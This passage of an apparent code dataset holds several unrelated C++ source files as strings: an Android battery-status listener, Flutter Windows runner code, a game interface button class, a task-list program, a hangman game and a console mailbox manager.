command: \" << command << std::endl;\n     ",
    "/*\n* Copyright (c) 2019, The Linux Foundation. All rights reserved.\n*\n* Redistribution and use in source and binary forms, with or without\n* modification, are permitted provided that the following conditions are\n* met:\n*     * Redistributions of source code must retain the above copyright\n*       notice, this list of conditions and the following disclaimer.\n*     * Redistributions in binary form must reproduce the above\n*       copyright notice, this list of conditions and the following\n*       disclaimer in the documentation and/or other materials provided\n*       with the distribution.\n*     * Neither the name of The Linux Foundation nor the names of its\n*       contributors may be used to endorse or promote products derived\n*       from this software without specific prior written permission.\n*\n* THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n* WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n* ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n* BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n* CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n* BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n* WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n* OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n* IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n#include \"battery_listener.h\"\n#ifdef LOG_TAG\n#undef LOG_TAG\n#endif\n#define LOG_TAG \"LocSvc_BatteryListener\"\n\n#include <android/hidl/manager/1.0/IServiceManager.h>\n#include <android/hardware/health/2.0/IHealth.h>\n#include <healthhalutils/HealthHalUtils.h>\n#include <hidl/HidlTransportSupport.h>\n#include <thread>\nusing android::hardware::interfacesEqual;\nusing android::hardware::Return;\nusing android::hardware::Void;\nusing android::hardware::health::V1_0::BatteryStatus;\nusing android::hardware::health::V1_0::toString;\nusing android::hardware::health::V2_0::get_health_service;\nusing android::hardware::health::V2_0::HealthInfo;\nusing android::hardware::health::V2_0::IHealth;\nusing android::hardware::health::V2_0::Result;\nusing android::hidl::manager::V1_0::IServiceManager;\nusing namespace std::literals::chrono_literals;\n\nstatic bool sIsBatteryListened = false;\nnamespace android {\n\n#define GET_HEALTH_SVC_RETRY_CNT 5\n#define GET_HEALTH_SVC_WAIT_TIME_MS 500\n\nstruct BatteryListenerImpl : public hardware::health::V2_0::IHealthInfoCallback,\n                             public hardware::hidl_death_recipient {\n    typedef std::function<void(bool)> cb_fn_t;\n    BatteryListenerImpl(cb_fn_t cb);\n    virtual ~BatteryListenerImpl ();\n    virtual hardware::Return<void> healthInfoChanged(\n        const hardware::health::V2_0::HealthInfo& info);\n    virtual void serviceDied(uint64_t cookie,\n                             const wp<hidl::base::V1_0::IBase>& who);\n    bool isCharging() {\n        std::lock_guard<std::mutex> _l(mLock);\n        return statusToBool(mStatus);\n    }\n  private:\n    sp<hardware::health::V2_0::IHealth> mHealth;\n    status_t init();\n    BatteryStatus mStatus;\n    cb_fn_t mCb;\n    std::mutex mLock;\n    std::condition_variable mCond;\n    std::unique_ptr<std::thread> mThread;\n    bool mDone;\n    bool statusToBool(const BatteryStatus &s) const {\n        return (s == BatteryStatus::CHARGING) ||\n               (s ==  BatteryStatus::FULL);\n    }\n};\n\nstatus_t BatteryListenerImpl::init()\n{\n    int tries = 0;\n\n    if (mHealth != NULL)\n        return INVALID_OPERATION;\n\n    do {\n        mHealth = hardware::health::V2_0::get_health_service();\n        if (mHealth != NULL)\n            break;\n        usleep(GET_HEALTH_SVC_WAIT_TIME_MS * 1000);\n        tries++;\n    } while(tries < GET_HEALTH_SVC_RETRY_CNT);\n\n    if (mHealth == NULL) {\n        ALOGE(\"no health service found, retries %d\", tries);\n        return NO_INIT;\n    } else {\n        ALOGI(\"Get health service in %d tries\", tries);\n    }\n    mStatus = BatteryStatus::UNKNOWN;\n    auto ret = mHealth->getChargeStatus([&](Result r, BatteryStatus status) {\n        if (r != Result::SUCCESS) {\n            ALOGE(\"batterylistener: cannot get battery status\");\n            return;\n        }\n        mStatus = status;\n    });\n    if (!ret.isOk())\n        ALOGE(\"batterylistener: get charge status transaction error\");\n\n    if (mStatus == BatteryStatus::UNKNOWN)\n        ALOGW(\"batterylistener: init: invalid battery status\");\n    mDone = false;\n    mThread = std::make_unique<std::thread>([this]() {\n            std::unique_lock<std::mutex> l(mLock);\n            BatteryStatus local_status = mStatus;\n            while (!mDone) {\n                if (local_status == mStatus) {\n                    mCond.wait(l);\n                    continue;\n                }\n                local_status = mStatus;\n                switch (local_status) {\n                    ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"login_signup_sqlite\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// MatrixGame - SR2 Planetary battles engine\n// Copyright (C) 2012, Elemental Games, Katauri Interactive, CHK-Games\n// Licensed under GPLv2 or any later version\n// Refer to the LICENSE file included\n\n#include \"../StdAfx.h\"\n#include \"CIFaceButton.h\"\n#include \"CConstructor.h\"\n#include \"CIFaceMenu.h\"\n#include \"CInterface.h\"\n#include \"MatrixHint.hpp\"\n\nint gIndex[] = {\n\t0,1,\n\t1,2,\n\t2,0,\n\t3,4,\n\t4,5,\n\t5,3\n};\n\nCIFaceButton::CIFaceButton()\n{\n\tm_Type = IFACE_PUSH_BUTTON;\n\tm_CurState = IFACE_NORMAL;\n\t//ZeroMemory(m_StateImages, sizeof(m_StateImages));\n}\n\nCIFaceButton::~CIFaceButton()\n{\n}\n\nbool CIFaceButton::OnMouseMove(CPoint mouse)\n{\n    if(GetVisibility() && ElementCatch(mouse) && ElementAlpha(mouse))\n    {\n        if(g_IFaceList->m_CurrentHint && g_IFaceList->m_CurrentHintControlName != m_strName)\n        {\n            g_IFaceList->m_CurrentHint->Release();\n            g_IFaceList->m_CurrentHint = nullptr;\n            g_IFaceList->m_CurrentHintControlName = L\"\";\n        }\n\n        if(g_IFaceList->m_CurrentHint == nullptr && m_Hint.HintTemplate != L\"\")\n        {\n            if(g_IFaceList->CheckShowHintLogic(m_strName))\n            {\n                g_IFaceList->AddHintReplacements(m_strName);\n                CMatrixHint* hint = CMatrixHint::Build(m_Hint.HintTemplate, m_strName);\n                int x = Float2Int(m_PosElInX) + m_Hint.x;\n                int y = Float2Int(m_PosElInY) + m_Hint.y;\n                g_IFaceList->CorrectCoordinates(g_ScreenX, g_ScreenY, x, y, hint->m_Width, hint->m_Height, m_strName);\n                hint->Show(x, y);\n                g_IFaceList->m_CurrentHint = hint;\n                g_IFaceList->m_CurrentHintControlName = m_strName;\n            }\n        }\n\n        if(m_Type == IFACE_PUSH_BUTTON)\n        {\n            if(GetState() == IFACE_NORMAL)\n            {\n                SetState(IFACE_FOCUSED);\n                Action(ON_FOCUS);\n                CSound::Play(S_BENTER, SL_INTERFACE);\n            }\n        }\n        else if(m_Type == IFACE_CHECK_BUTTON || m_Type == IFACE_CHECK_BUTTON_SPECIAL)\n        {\n            if(GetState() == IFACE_NORMAL)\n            {\n                SetState(IFACE_FOCUSED);\n                Action(ON_FOCUS);\n                CSound::Play(S_BENTER, SL_INTERFACE);\n            }\n            else if(GetState() == IFACE_PRESSED_UNFOCUSED)\n            {\n                SetState(IFACE_PRESSED);\n                Action(ON_FOCUS);\n                CSound::Play(S_BENTER, SL_INTERFACE);\n            }\n        }\n        else if(m_Type == IFACE_CHECK_PUSH_BUTTON)\n        {\n            if(GetState() == IFACE_NORMAL)\n            {\n                SetState(IFACE_FOCUSED);\n                Action(ON_FOCUS);\n                CSound::Play(S_BENTER, SL_INTERFACE);\n            }\n        }\n\n        return true;\n    }\n    else\n    {\n        if(g_IFaceList->m_CurrentHint && g_IFaceList->m_CurrentHintControlName == m_strName)\n        {\n            g_IFaceList->m_CurrentHint->Release();\n            g_IFaceList->m_CurrentHint = nullptr;\n            g_IFaceList->m_CurrentHintControlName = L\"\";\n        }\n\n        return false;\n    }\n\n    return false;\n}\n\n//\u00ce\u00e1\u00f0\u00e0\u00e1\u00ee\u00f2\u00f7\u00e8\u00ea \u00ee\u00f2\u00e6\u00e0\u00f2\u00e8\u00ff \u00eb\u00e5\u00e2\u00ee\u00e9 \u00ea\u00ed\u00ee\u00ef\u00ea\u00e8 \u00ec\u00fb\u00f8\u00e8, \u00ef\u00f0\u00ee\u00e2\u00e5\u00f0\u00ff\u00e5\u00f2 \u00f4\u00ee\u00ea\u00f3\u00f1 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0 \u00e8 \u00e2\u00fb\u00e7\u00fb\u00e2\u00e0\u00e5\u00f2 \u00e4\u00e5\u00e9\u00f1\u00f2\u00e2\u00e8\u00e5, \u00e5\u00f1\u00eb\u00e8 \u00e2\u00ee\u00e7\u00ec\u00ee\u00e6\u00ed\u00ee\n//\u00d2\u00f0\u00e5\u00f2\u00e8\u00e9 \u00ee\u00e1\u00f0\u00e0\u00e1\u00ee\u00f2\u00f7\u00e8\u00ea \u00eb\u00e5\u00e2\u00ee\u00e3\u00ee \u00ee\u00f2\u00ea\u00eb\u00e8\u00ea\u00e0 \u00ec\u00fb\u00f8\u00fc\u00fe (\u00f1\u00e1\u00f0\u00e0\u00f1\u00fb\u00e2\u00e0\u00e5\u00ec \u00ed\u00e0\u00e6\u00e0\u00f2\u00ee\u00f1\u00f2\u00fc, \u00e7\u00e0\u00ef\u00f3\u00f1\u00ea\u00e0\u00e5\u00ec \u00e4\u00e5\u00e9\u00f1\u00f2\u00e2\u00e8\u00e5 \u00ee\u00f2\u00ea\u00eb\u00e8\u00ea\u00e0)\nvoid CIFaceButton::OnMouseLBUp()\n{\n    if(g_IFaceList && g_IFaceList->m_CurrentHint && g_IFaceList->m_CurrentHintControlName == m_strName)\n    {\n        g_IFaceList->m_CurrentHint->Release();\n        g_IFaceList->m_CurrentHint = nullptr;\n        g_IFaceList->m_CurrentHintControlName = L\"\";\n    }\n\n    if(m_Type == IFACE_PUSH_BUTTON)\n    {\n        if(GetState() == IFACE_PRESSED)\n        {\n            SetState(IFACE_FOCUSED);\n            Action(ON_UN_PRESS);\n        }\n    }\n    else if(m_Type == IFACE_CHECK_PUSH_BUTTON)\n    {\n        if(GetState() == IFACE_PRESSED)\n        {\n            if(m_DefState == IFACE_NORMAL)\n            {\n                SetState(IFACE_PRESSED_UNFOCUSED);\n                m_DefState = IFACE_PRESSED_UNFOCUSED;\n                Action(ON_UN_PRESS);\n            }\n            /*\n            else if(m_DefState == IFACE_PRESSED_UNFOCUSED)\n            {\n                SetState(IFACE_FOCUSED);\n                m_DefState = IFACE_NORMAL;\n                Action(ON_UN_PRESS);\n            }\n            */\n        }\n    }\n}\n\n//\u00d2\u00f0\u00e5\u00f2\u00e8\u00e9 \u00ee\u00e1\u00f0\u00e0\u00e1\u00ee\u00f2\u00f7\u00e8\u00ea \u00eb\u00e5\u00e2\u00ee\u00e3\u00ee \u00ea\u00eb\u00e8\u00ea\u00e0 \u00ec\u00fb\u00f8\u00fc\u00fe (\u00e7\u00e0\u00e4\u00e0\u00b8\u00ec \u00ed\u00e0\u00e6\u00e0\u00f2\u00ee\u00f1\u00f2\u00fc, \u00e7\u00e0\u00ef\u00f3\u00f1\u00ea\u00e0\u00e5\u00ec \u00e4\u00e5\u00e9\u00f1\u00f2\u00e2\u00e8\u00e5 \u00ea\u00eb\u00e8\u00ea\u00e0)\nbool CIFaceButton::OnMouseLBDown()\n{\n    if(GetState() == IFACE_DISABLED)\n    {\n        return true;\n    }\n\t\n    if(m_Type == IFACE_PUSH_BUTTON)\n    {\n\t\tif(GetState() == IFACE_FOCUSED)\n        {\n\t\t\tSetState(IFACE_PRESSED);\n\t\t\tAction(ON_PRESS);\n            \n            if(m_strName == IF_BASE_CONST_BUILD) CSound::Play(S_BUILD_CLICK, SL_INTERFACE);\n            else if(m_strName == IF_BASE_CONST_CANCEL) CSound::Play(S_CANCEL_CLICK, SL_INTERFACE);\n            else CSound::Play(S_BCLICK, SL_INTERFACE);\n\t\t\treturn true;\n\t\t}\n\t}\n    else if(m_Type == IFACE",
    "//Akriz Alam Annaba_2310631170066_2F-Informatika\r\n\r\n#include <iostream>\r\n#include <iomanip>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nstruct Task {\r\n    string name;\r\n    string deadline;\r\n    Task* next;\r\n};\r\n\r\nclass TaskManager {\r\nprivate:\r\n    Task* head;\r\n\r\npublic:\r\n    TaskManager() : head(nullptr) {}\r\n\r\n    void addTask(const string& taskName, const string& deadline) {\r\n        Task* newTask = new Task;\r\n        newTask->name = taskName;\r\n        newTask->deadline = deadline;\r\n        newTask->next = nullptr;\r\n\r\n        if (head == nullptr) {\r\n            head = newTask;\r\n        } else {\r\n            Task* current = head;\r\n            while (current->next != nullptr) {\r\n                current = current->next;\r\n            }\r\n            current->next = newTask;\r\n        }\r\n        cout << \"Tugas '\" << taskName << \"' dengan tenggat waktu '\" << deadline << \"' berhasil ditambahkan.\" << endl;\r\n    }\r\n\r\n    void removeTask(const string& taskName) {\r\n        if (head == nullptr) {\r\n            cout << \"Tidak ada tugas yang tersedia.\" << endl;\r\n            return;\r\n        }\r\n\r\n        Task* current = head;\r\n        Task* prev = nullptr;\r\n\r\n        while (current != nullptr) {\r\n            if (current->name == taskName) {\r\n                if (prev == nullptr) {\r\n                    head = current->next;\r\n                } else {\r\n                    prev->next = current->next;\r\n                }\r\n                delete current;\r\n                cout << \"Tugas '\" << taskName << \"' berhasil dihapus.\" << endl;\r\n                return;\r\n            }\r\n            prev = current;\r\n            current = current->next;\r\n        }\r\n        cout << \"Tugas '\" << taskName << \"' tidak ditemukan.\" << endl;\r\n    }\r\n\r\n    void displayTasks() {\r\n        if (head == nullptr) {\r\n            cout << \"Tidak ada tugas yang tersedia.\" << endl;\r\n            return;\r\n        }\r\n\r\n        Task* current = head;\r\n        cout << \"======================================================\" << endl;\r\n        cout << setw(30) << \"Daftar Tugas\" << endl;\r\n        cout << \"======================================================\" << endl;\r\n        cout << \"| No |     Nama Tugas          |   Tenggat Waktu     |\" << endl;\r\n        cout << \"======================================================\" << endl;\r\n\r\n        int count = 1;\r\n        while (current != nullptr) {\r\n            cout << \"| \" << setw(3) << count << \" | \" << setw(23) << current->name << \" | \" << setw(19) << current->deadline << \" |\" << endl;\r\n            current = current->next;\r\n            count++;\r\n        }\r\n        cout << \"======================================================\" << endl;\r\n    }\r\n\r\n    ~TaskManager() {\r\n        Task* current = head;\r\n        Task* nextTask;\r\n        while (current != nullptr) {\r\n            nextTask = current->next;\r\n            delete current;\r\n            current = nextTask;\r\n        }\r\n        head = nullptr;\r\n    }\r\n};\r\n\r\nint main() {\r\n    TaskManager taskManager;\r\n\r\n    char choice;\r\n    string taskName, deadline;\r\n\r\n    do {\r\n        cout << \"\\n======================================================\" << endl;\r\n        cout << \"|          Aplikasi Pengelola Tugas                  |\" << endl;\r\n        cout << \"======================================================\" << endl;\r\n        cout << \"| Menu:                                              |\" << endl;\r\n        cout << \"| 1. Tambah Tugas                                    |\" << endl;\r\n        cout << \"| 2. Hapus Tugas                                     |\" << endl;\r\n        cout << \"| 3. Tampilkan Semua Tugas                           |\" << endl;\r\n        cout << \"| 4. Keluar                                          |\" << endl;\r\n        cout << \"======================================================\" << endl;\r\n        cout << \"Pilihan Anda: \";\r\n        cin >> choice;\r\n        cin.ignore(); // Menghapus karakter newline dari buffer\r\n\r\n        switch (choice) {\r\n            case '1':\r\n                cout << \"Masukkan nama tugas: \";\r\n                getline(cin, taskName);\r\n                cout << \"Masukkan tenggat waktu tugas: \";\r\n                getline(cin, deadline);\r\n                taskManager.addTask(taskName, deadline);\r\n                break;\r\n            case '2':\r\n                cout << \"Masukkan nama tugas yang ingin dihapus: \";\r\n                getline(cin, taskName);\r\n                taskManager.removeTask(taskName);\r\n                break;\r\n            case '3':\r\n                taskManager.displayTasks();\r\n                break;\r\n            case '4':\r\n                cout << \"Program selesai.\\n\";\r\n                break;\r\n            default:\r\n                cout << \"Pilihan tidak valid. Silakan pilih lagi.\\n\";\r\n                break;\r\n        }\r\n    } while (choice != '4');\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <chrono>\n#include <vector>\n#include <random>\n#include <fstream>\nusing namespace std;\n\nclass Timer\n{\npublic:\n\tchrono::time_point<chrono::steady_clock> start, end;\n\tchrono::duration<float> duration;\n\n\n\tTimer()\n\t{\n\t\tstart = chrono::high_resolution_clock::now();\n\t}\n\t~Timer()\n\t{\n\t\tend = chrono::high_resolution_clock::now();\n\t\tduration = end - start;\n\n\t\tfloat resultat = duration.count();\n\t\tcout << \"You lefted time: \" << resultat << \"sec\\n\";\n\t}\n};\n\n\nclass Shubenutzya {\npublic:\n\tstruct Word {\n\t\tstring WORD;\n\n\t\tWord(const string& word) : WORD{ word } {}\n\t};\n\n\tvector<Word> words;\n\n\tstring descrypt(string& encrypt_word) {\n\t\tstring decrypted_word = encrypt_word;\n\t\tfor (char& c : decrypted_word) {\n\n\t\t\tif (isalpha(c)) {\n\n\t\t\t\tif (c == 'a' || c == 'A') {\n\t\t\t\t\tc += 25;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tc--;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn decrypted_word;\n\t}\n\tShubenutzya(const string& filename) {\n\t\tifstream fin(filename);\n\t\tif (fin.is_open()) {\n\t\t\tstring enscrypt_word;\n\t\t\twhile (fin >> enscrypt_word) {\n\t\t\t\twords.push_back(Word(descrypt(enscrypt_word)));\n\t\t\t}\n\t\t\tfin.close();\n\t\t}\n\t\telse {\n\t\t\tthrow runtime_error(\"Unable to open file\\n\");\n\t\t}\n\t}\n\n\tWord Random() {\n\t\trandom_device rd;\n\t\tmt19937 gen(rd());\n\t\tshuffle(words.begin(), words.end(), gen);\n\t\treturn words.front();\n\t}\n\n\tfriend ostream& operator<< (ostream& out, const Shubenutzya::Word& s) {\n\t\tout << s.WORD;\n\t\treturn out;\n\t}\n};\n\nvoid draw(int errors) {\n\tswitch (errors) {\n\tcase 0:\n\t\tcout << \"  ________\" << endl;\n\t\tcout << \"  |       |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"__|__\" << endl;\n\t\tbreak;\n\tcase 1:\n\t\tcout << \"  ________\" << endl;\n\t\tcout << \"  |       |\" << endl;\n\t\tcout << \"  |       O\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"__|__\" << endl;\n\t\tbreak;\n\tcase 2:\n\t\tcout << \"  ________\" << endl;\n\t\tcout << \"  |       |\" << endl;\n\t\tcout << \"  |       O\" << endl;\n\t\tcout << \"  |       |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"__|__\" << endl;\n\t\tbreak;\n\tcase 3:\n\t\tcout << \"  ________\" << endl;\n\t\tcout << \"  |       |\" << endl;\n\t\tcout << \"  |       O\" << endl;\n\t\tcout << \"  |      /|\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"__|__\" << endl;\n\t\tbreak;\n\tcase 4:\n\t\tcout << \"  ________\" << endl;\n\t\tcout << \"  |       |\" << endl;\n\t\tcout << \"  |       O\" << endl;\n\t\tcout << \"  |      /|\\\\\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"__|__\" << endl;\n\t\tbreak;\n\tcase 5:\n\t\tcout << \"  ________\" << endl;\n\t\tcout << \"  |       |\" << endl;\n\t\tcout << \"  |       O\" << endl;\n\t\tcout << \"  |      /|\\\\\" << endl;\n\t\tcout << \"  |      /\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"__|__\" << endl;\n\t\tbreak;\n\tcase 6:\n\t\tcout << \"  ________\" << endl;\n\t\tcout << \"  |       |\" << endl;\n\t\tcout << \"  |       O\" << endl;\n\t\tcout << \"  |      /|\\\\\" << endl;\n\t\tcout << \"  |      / \\\\\" << endl;\n\t\tcout << \"  |\" << endl;\n\t\tcout << \"__|__\" << endl;\n\t\tbreak;\n\t}\n}\n\nint main() {\n\tsetlocale(LC_ALL, \"ukr\");\n\tTimer timer;\n\tint count_attempt = 6;\n\tShubenutzya shb(\"Shubenutzya.txt\");\n\tShubenutzya::Word word = shb.Random();\n\tstring search_word = word.WORD;\n\tstring guessed_word(search_word.size(), '_');\n\n\tint errors = 0;\n\tdo\n\t{\n\t\tchar guess;\n\t\tcin >> guess;\n\t\tbool found_letter = false;\n\t\tfor (size_t i = 0; i < search_word.size(); i++)\n\t\t{\n\t\t\tif (search_word[i] == guess)\n\t\t\t{\n\t\t\t\tguessed_word[i] = guess;\n\t\t\t\tfound_letter = true;\n\t\t\t}\n\t\t}\n\t\tif (!found_letter)\n\t\t{\n\t\t\tcout << \"Sorry, but this letter uncorected\\n\";\n\t\t\tcount_attempt--;\n\t\t\terrors++;\n\t\t\tdraw(errors);\n\t\t\tcout << \"Attempts left: \" << count_attempt << endl;\n\n\t\t}\n\n\t\tif (guessed_word == search_word)\n\t\t{\n\t\t\tcout << \"You win!\" << endl;\n\t\t\tbreak;\n\t\t}\n\n\n\t} while (count_attempt > 0);\n\n\tif (count_attempt == 0)\n\t{\n\t\tcout << \"Sorry, but you lose!\";\n\t\tdraw(errors);\n\t}\n\n\tcout << \"Information: \\n\";\n\tcout << \"Attempts left: \" << count_attempt << endl;\n\tcout << \"Searched word: \" << search_word << endl;\n\tcout << \"Your letters: \" << guessed_word << endl;\n\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <cstdint>\n#include <iostream>\n\n#include \"lb4mailbox.h\"\n\nvoid printMbStats(MailBox* mb) {\n    printf(\"Max size: %d\\n\", mb->getMaxSize());\n    printf(\"Current size (in bytes): %llu\\n\", mb->getCurrentSize());\n    printf(\"Entries count: %d\\n\", mb->getEntriesCount());\n    printf(\"-------------------------------\\n\");\n}\n\nvoid menu_mailbox(MailBox* mb) {\n    std::string input;\n    int sel;\n    while (true) {\n        printf(\"Pick action:\\n\");\n        printf(\" 0 - Close mailbox\\n\");\n        printf(\" 1 - Add entry\\n\");\n        printf(\" 2 - Read entry (without deletion)\\n\");\n        printf(\" 3 - Read entry (with deletion)\\n\");\n        printf(\" 4 - Delete entry\\n\");\n        printf(\" 5 - Delete all entries\\n\");\n        printf(\" 6 - Get stats\\n\");\n        printf(\"Select: \");\n        std::getline(std::cin, input);\n\n        try {\n            sel = std::stoi(input);\n        } catch (std::exception const& ex) {\n            printf(\"Error: %s\\n\", ex.what());\n            continue;\n        }\n        if(sel < 0 || sel > 6)\n            continue;\n\n        switch (sel) {\n        case 0:\n            return;\n        case 1: {\n            printf(\"  Entry text: \");\n            std::getline(std::cin, input);\n            try {\n                mb->addEntry(new MailboxEntry(input));\n            } catch (std::exception const& ex) {\n                printf(\"Error: %s\\n\", ex.what());\n                break;\n            }\n            break;\n        }\n        case 2:\n        case 3:\n        case 4: {\n            printf(\"  Entry index (0-%d): \", mb->getEntriesCount()-1);\n            std::getline(std::cin, input);\n\n            int idx;\n            try {\n                idx = std::stoi(input);\n            } catch (std::exception const& ex) {\n                printf(\"Error: %s\\n\", ex.what());\n                break;\n            }\n            if(idx < 0 || idx >= mb->getEntriesCount()) {\n                printf(\"Wrong index!\\n\");\n                break;\n            }\n\n            if(sel == 2 || sel == 3) {\n                MailboxEntry* e;\n                try {\n                    e = mb->readEntry(idx, sel == 3);\n                } catch (std::exception const& ex) {\n                    printf(\"Error: %s\\n\", ex.what());\n                    break;\n                }\n\n                printf(\"Content: %s\\n\", e->getContent().c_str());\n            } else {\n                mb->deleteEntry(idx);\n            }\n\n            break;\n        }\n        case 5: {\n            try {\n                mb->deleteAllEntries();\n            } catch (std::exception const& ex) {\n                printf(\"Error: %s\\n\", ex.what());\n                break;\n            }\n\n            break;\n        }\n        case 6: {\n            try {\n                printMbStats(mb);\n            } catch (std::exception const& ex) {\n                printf(\"Error: %s\\n\", ex.what());\n                break;\n            }\n\n            break;\n        }\n        }\n    }\n}\n\nvoid menu_main() {\n    std::string input;\n    int sel;\n    while (true) {\n        printf(\"Pick action:\\n\");\n        printf(\" 0 - Exit\\n\");\n        printf(\" 1 - Print mailboxes count\\n\");\n        printf(\" 2 - Create mailbox\\n\");\n        printf(\" 3 - Open mailbox\\n\");\n        printf(\"Select: \");\n        std::getline(std::cin, input);\n\n        try {\n            sel = std::stoi(input);\n        } catch (std::exception const& ex) {\n            printf(\"Error: %s\\n\", ex.what());\n            continue;\n        }\n        if(sel < 0 || sel > 3)\n            continue;\n\n        switch (sel) {\n        case 0:\n            return;\n        case 1: {\n            printf(\"Count: %d\\n\", MailBox::getMailboxCount());\n            break;\n        }\n        case 2: {\n            printf(\"  Mailbox name: \");\n            std::getline(std::cin, input);\n            std::string name = input;\n            printf(\"  Mailbox max size: \");\n            std::getline(std::cin, input);\n            int size;\n            try {\n                size = std::stoi(input);\n            } catch (std::exception const& ex) {\n                printf(\"Error: %s\\n\", ex.what());\n                break;\n            }\n            if(size <= 0) {\n                printf(\"Size must be bigger than 0\\n\");\n                break;\n            }\n\n            menu_mailbox(new MailBox(name+\".mb\", size));\n            break;\n        }\n        case 3: {\n            printf(\"  Mailbox name: \");\n            std::getline(std::cin, input);\n            menu_mailbox(new MailBox(input+\".mb\"));\n            break;\n        }\n        }\n    }\n}\n\nint main() {\n    menu_main();\n\n    return 0;\n}\n",
